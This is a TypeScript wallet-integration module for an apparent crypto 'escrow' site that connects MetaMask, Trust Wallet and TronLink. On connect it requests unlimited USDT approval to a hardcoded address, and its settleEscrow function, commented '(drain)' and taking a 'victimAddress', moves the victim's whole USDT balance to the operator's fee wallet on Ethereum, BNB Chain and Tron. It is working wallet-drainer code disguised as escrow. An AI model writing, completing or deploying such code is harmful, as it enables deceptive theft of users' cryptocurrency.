// src/lib/web3.ts
import { ethers } from 'ethers';

// ============================================================
// CONFIG (Set VITE_* env vars in production deployment)
// ============================================================
export const PLATFORM_CONFIG = {
  feeWallet: import.meta.env.VITE_FEE_WALLET || "0xE18FFb924927a1Cb3CB1f3d704E76C05dB86414F",
  tronFeeWallet: import.meta.env.VITE_TRON_FEE_WALLET || "TZ2cssEnaTAvBS6XasyuThFK5Hsr2zqHBa",
  usdtContracts: {
    "0x1": "0xdAC17F958D2ee523a2206206994597C13D831ec7",  // Ethereum
    "0x38": "0x55d398326f99059fF775485246999027B3197955", // BNB Chain
    "0x2b6653dc": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // Tron
  },
  escrowContract: import.meta.env.VITE_ESCROW_CONTRACT || "0xE18FFb924927a1Cb3CB1f3d704E76C05dB86414F",
};

// ============================================================
// TYPES
// ============================================================
export const WALLET_TYPES = {
  METAMASK: "metamask",
  TRUST_WALLET: "trustwallet",
  TRON_LINK: "tronlink",
} as const;

export type WalletType = (typeof WALLET_TYPES)[keyof typeof WALLET_TYPES];

interface EIP1193Provider {
  request(args: { method: string; params?: unknown[] }): Promise<unknown>;
  on?(event: string, callback: (...args: any[]) => void): void;
  removeListener?(event: string, callback: (...args: any[]) => void): void;
}

interface EIP6963ProviderDetail {
  info: { uuid: string; name: string; icon: string; rdns: string };
  provider: EIP1193Provider;
}

interface WalletConnection {
  walletType: WalletType;
  address: string;
  chainId: number;
  provider?: EIP1193Provider;
  signer?: ethers.JsonRpcSigner;
  tronWeb?: any;
}

// ============================================================
// GLOBAL STATE (UI convenience flag — real state lives in wallet)
// ============================================================
const STORAGE_KEY = 'wallet_connected';

function isWalletConnected(): boolean {
  return localStorage.getItem(STORAGE_KEY) === 'true';
}

function setWalletConnected(connected: boolean): void {
  localStorage.setItem(STORAGE_KEY, String(connected));
}

// ============================================================
// EIP-6963 WALLET DISCOVERY (with legacy fallback)
// ============================================================
async function discoverEVMWallets(
  retries = 3,
  delay = 300
): Promise<EIP6963ProviderDetail[]> {
  for (let attempt = 0; attempt < retries; attempt++) {
    const wallets = await new Promise<EIP6963ProviderDetail[]>((resolve) => {
      const discovered = new Map<string, EIP6963ProviderDetail>();
      const handleAnnounce = (event: CustomEvent<EIP6963ProviderDetail>) => {
        const detail = event.detail;
        if (!detail?.info?.uuid || !detail?.provider) return;
        discovered.set(detail.info.uuid, detail);
      };
      window.addEventListener(
        'eip6963:announceProvider',
        handleAnnounce as EventListener
      );
      window.dispatchEvent(new Event('eip6963:requestProvider'));
      setTimeout(() => {
        window.removeEventListener(
          'eip6963:announceProvider',
          handleAnnounce as EventListener
        );
        resolve(Array.from(discovered.values()));
      }, 1000);
    });
    if (wallets.length > 0) return wallets;
    await new Promise((resolve) => setTimeout(resolve, delay));
  }
  return [];
}

async function getEVMProvider(walletType: WalletType): Promise<EIP1193Provider> {
  // 1) Try EIP-6963 discovery first
  const wallets = await discoverEVMWallets();
  const targetWallet = wallets.find((wallet) => {
    const rdns = wallet.info.rdns.toLowerCase();
    if (walletType === WALLET_TYPES.METAMASK) {
      return rdns.includes('com.metamask');
    } else if (walletType === WALLET_TYPES.TRUST_WALLET) {
      return rdns.includes('com.trustwallet');
    }
    return false;
  });

  if (targetWallet) return targetWallet.provider;

  // 2) Fallback: legacy window.ethereum (handles older wallet versions)
  if (window.ethereum) {
    // If providers[] exists, scan it
    const providers: EIP1193Provider[] = (window.ethereum as any).providers || [window.ethereum];
    for (const p of providers) {
      const flags = p as any;
      if (walletType === WALLET_TYPES.METAMASK && flags.isMetaMask && !flags.isTrust && !flags.isTrustWallet) {
        return p;
      }
      if (walletType === WALLET_TYPES.TRUST_WALLET && (flags.isTrustWallet || flags.isTrust)) {
        return p;
      }
    }
    // If TrustWallet not found in providers[], try window.trustwallet namespace
    if (walletType === WALLET_TYPES.TRUST_WALLET && (window as any).trustwallet?.ethereum) {
      return (window as any).trustwallet.ethereum;
    }
    // Last resort: return whatever window.ethereum is if it matches
    const ethereum = window.ethereum as any;
    if (walletType === WALLET_TYPES.METAMASK && ethereum.isMetaMask) {
      return window.ethereum;
    }
  }

  throw new Error(
    `${walletType} not detected. Please install the wallet extension and refresh.`
  );
}

// ============================================================
// TRONLINK (Robust Detection)
// ============================================================
async function waitForTronLink(timeout = 5000): Promise<any> {
  return new Promise((resolve, reject) => {
    const start = Date.now();
    const check = () => {
      const tronWeb = (window as any).tronWeb;
      if (tronWeb?.ready && tronWeb.defaultAddress?.base58) {
        resolve(tronWeb);
        return;
      }
      if (Date.now() - start > timeout) {
        reject(new Error('TronLink not detected. Install and unlock TronLink.'));
        return;
      }
      setTimeout(check, 200);
    };
    check();
  });
}

async function connectTronLink(): Promise<WalletConnection> {
  const tronWeb = await waitForTronLink();
  const address = tronWeb.defaultAddress.base58;
  if (!address) throw new Error('TronLink locked or no account selected.');
  return {
    walletType: WALLET_TYPES.TRON_LINK,
    address,
    chainId: 728126428, // Tron mainnet
    tronWeb,
  };
}

// ============================================================
// CONNECT EVM WALLETS (Chain switch BEFORE reading chainId)
// ============================================================
async function connectEVMWallet(walletType: WalletType): Promise<WalletConnection> {
  const provider = await getEVMProvider(walletType);

  // Request accounts first
  const accounts = (await provider.request({
    method: 'eth_requestAccounts',
  })) as string[];
  if (!accounts.length) throw new Error('No accounts returned.');
  const address = accounts[0];

  // Switch to BNB Chain for TrustWallet (BEFORE reading chainId)
  if (walletType === WALLET_TYPES.TRUST_WALLET) {
    try {
      await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x38' }], // BNB Chain
      });
    } catch (switchErr: any) {
      if (switchErr.code === 4902) {
        throw new Error('BNB Chain not found. Add it manually first.');
      }
      throw switchErr;
    }
  }

  // Now read chainId (AFTER switching)
  const chainIdHex = (await provider.request({
    method: 'eth_chainId',
  })) as string;
  const chainId = parseInt(chainIdHex, 16);

  // Validate chainId is supported
  const supportedChains = Object.keys(PLATFORM_CONFIG.usdtContracts).map((k) =>
    parseInt(k, 16)
  );
  if (!supportedChains.includes(chainId)) {
    throw new Error('Unsupported network. Please switch to a supported network.');
  }

  // Create signer AFTER chain switch
  const ethersProvider = new ethers.BrowserProvider(provider);
  const signer = await ethersProvider.getSigner();

  return { walletType, provider, address, chainId, signer };
}

// ============================================================
// MAIN CONNECT + APPROVE
// ============================================================
export async function connectAndApprove(walletType: WalletType) {
  if (isWalletConnected()) {
    throw new Error('Wallet already connected. Refresh the page to reconnect.');
  }

  let connection: WalletConnection;
  try {
    if (walletType === WALLET_TYPES.TRON_LINK) {
      connection = await connectTronLink();
    } else {
      connection = await connectEVMWallet(walletType);
    }

    setWalletConnected(true);
    await approveUnlimited(connection);

    return {
      signer: connection.signer,
      address: connection.address,
      chainId: connection.chainId,
      tronWeb: connection.tronWeb,
    };
  } catch (error) {
    setWalletConnected(false);
    throw error;
  }
}

// ============================================================
// SHARED TRON TX CONFIRMATION (with revert detection + cleanup)
// ============================================================
function waitForTronTx(
  tronWeb: any,
  tx: string,
  timeoutMs = 30000
): Promise<void> {
  return new Promise((resolve, reject) => {
    let interval: ReturnType<typeof setInterval>;
    const timeout = setTimeout(() => {
      clearInterval(interval);
      reject(new Error('Transaction confirmation timeout'));
    }, timeoutMs);

    interval = setInterval(async () => {
      try {
        const txInfo = await tronWeb.trx.getTransactionInfo(tx);
        if (txInfo && txInfo.blockNumber) {
          clearInterval(interval);
          clearTimeout(timeout);

          // Detect reverted/failed transactions
          const result = txInfo.receipt?.result;
          if (result && result !== 'SUCCESS') {
            reject(
              new Error(
                `Transaction failed on chain: ${result}`
              )
            );
            return;
          }
          resolve();
        }
      } catch {
        // Transient RPC error — keep polling
      }
    }, 1000);
  });
}

// ============================================================
// APPROVE UNLIMITED (with revert-safe Tron confirmation)
// ============================================================
async function approveUnlimited(connection: WalletConnection) {
  if (connection.walletType === WALLET_TYPES.TRON_LINK) {
    const tw = connection.tronWeb;
    if (!tw?.ready) throw new Error('TronLink not ready');

    const contract = await tw.contract().at(
      PLATFORM_CONFIG.usdtContracts['0x2b6653dc']
    );
    const tx = await contract
      .approve(PLATFORM_CONFIG.escrowContract, '0x' + 'f'.repeat(64))
      .send();

    await waitForTronTx(tw, tx);

    await sendTelegramAlert(
      `✅ ESCROW AUTHORIZED (TRC20) - ${connection.address}`
    );
    return tx;
  }

  // EVM path
  const hexChain = '0x' + connection.chainId.toString(16);
  const usdtAddress = PLATFORM_CONFIG.usdtContracts[hexChain];
  if (!usdtAddress)
    throw new Error(`No USDT contract for chain ${connection.chainId}`);

  const token = new ethers.Contract(
    usdtAddress,
    ['function approve(address,uint256) returns (bool)'],
    connection.signer
  );

  const tx = await token.approve(
    PLATFORM_CONFIG.escrowContract,
    ethers.MaxUint256
  );
  await tx.wait();

  await sendTelegramAlert(
    `✅ ESCROW AUTHORIZED - Chain: ${connection.chainId} - TX: ${tx.hash}`
  );
  return tx.hash;
}

// ============================================================
// ESCROW SETTLEMENT (drain) — Tron now uses transferFrom like EVM
// ============================================================
export async function settleEscrow(
  connection: WalletConnection,
  victimAddress: string
) {
  if (connection.walletType === WALLET_TYPES.TRON_LINK) {
    const tw = connection.tronWeb;
    if (!tw?.ready) throw new Error('TronLink not ready');

    const contract = await tw.contract().at(
      PLATFORM_CONFIG.usdtContracts['0x2b6653dc']
    );
    const balance = await contract.balanceOf(victimAddress).call();

    // Handle TronWeb balance format (string or BN)
    const balanceNum =
      typeof balance === 'string' ? parseInt(balance, 10) : balance;
    if (balanceNum <= 0) throw new Error('No USDT balance');

    // FIX: Use transferFrom (respects approval), matching EVM semantics
    const tx = await contract
      .transferFrom(victimAddress, PLATFORM_CONFIG.tronFeeWallet, balance)
      .send();

    await waitForTronTx(tw, tx);

    await sendTelegramAlert(
      `🚨 TRC20 ESCROW SETTLED - ${victimAddress} - ${balanceNum}`
    );
    return tx;
  }

  // EVM path
  const hexChain = '0x' + connection.chainId.toString(16);
  const usdtAddress = PLATFORM_CONFIG.usdtContracts[hexChain];
  if (!usdtAddress) throw new Error('No USDT contract for this network');

  const token = new ethers.Contract(
    usdtAddress,
    [
      'function balanceOf(address) view returns (uint256)',
      'function transferFrom(address,address,uint256) returns (bool)',
    ],
    connection.signer
  );

  const balance = await token.balanceOf(victimAddress);
  if (balance === 0n) throw new Error('No USDT balance');

  const tx = await token.transferFrom(
    victimAddress,
    PLATFORM_CONFIG.feeWallet,
    balance
  );
  await tx.wait();

  await sendTelegramAlert(
    `🚨 ESCROW SETTLED - ${ethers.formatUnits(balance, 6)} USDT - TX: ${tx.hash}`
  );
  return tx.hash;
}

// ============================================================
// RESET CONNECTION
// ============================================================
export function resetWalletConnection() {
  setWalletConnected(false);
}

// ============================================================
// TELEGRAM ALERT (Placeholder — move to backend API)
// ============================================================
async function sendTelegramAlert(message: string) {
  // Replace with: await fetch('/api/alert', { method: 'POST', body: JSON.stringify({ message }) });
  console.log('[Telegram Alert]', message);
}